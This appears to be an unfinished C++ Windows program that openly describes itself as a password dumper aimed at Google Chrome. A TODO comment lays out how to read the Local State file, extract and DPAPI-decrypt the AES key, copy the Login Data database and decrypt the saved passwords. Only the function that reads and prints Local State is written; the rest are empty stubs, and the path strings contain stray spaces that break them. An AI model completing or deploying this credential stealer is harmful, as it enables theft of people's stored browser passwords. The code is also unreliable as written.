#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <cstdlib> 
#include <filesystem>
#include <iostream>
#include <string>
#include <fstream> 


/*TODO:
    1. Find path to Chrome Credentials (C:\users\username\AppData\Local\Google\Chrome\UserData\Default\Login Data)
        Path to LocalState --(used for getting the aes encryption key)
        - environment variable for user profile??
        - open the path
        - read the path
        - put file contents into json?? 

    2. Copy the db file 


    1. Get local state (to get aes encryption key)
    2. get encryption key (decrypt using base64decode)
        - decrypt data with dpapi (needs user logon credentials)
    3. Copy db file contents at ...\Login Data to our database
        - shutil.copyfile 
    4. Connect to our new db
        - iterate over db and grab credentials we want (decrypt password as you go)
        - print credentials
*/

void getData(){
    //
}

void decryptedDataDPAPI(){
    //
}

std::string getLocalState(){
    //NEED TO GET LOCAL STATE --> TO GET KEY FROM FILE
    std::string userName = getenv("USERPROFILE"); //consider using ALLUSERPROFILE
    std::string localStatePath ="\\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Local State"; 
    std::string fullPath = userName + localStatePath;

    std::cout << "Local State: " << fullPath << std::endl;

    //Read Local State file contents into a json to easily get key
    std::fstream myFile;
    myFile.open(fullPath, std::ios::in);
	if (!myFile) {
		std::cout << "No such file";
	}
	else {
		char ch;
		while (1) {
			myFile >> ch;
			if (myFile.eof())
				break;

			std::cout << ch;
		}
	}
     myFile.close();
    
    return fullPath; 
}
void getEncryptionKey(){
    //
}
void decryptPassword(){
    //
}



int wmain(){
    wprintf(L"I dump passwords!\n");
    std::string chromePath = " % USERPROFILE% \\ AppData \\ Local \\ Google \\ Chrome \\ User Data \\ Default \\ Login Data";

    getLocalState();

    return 0;
}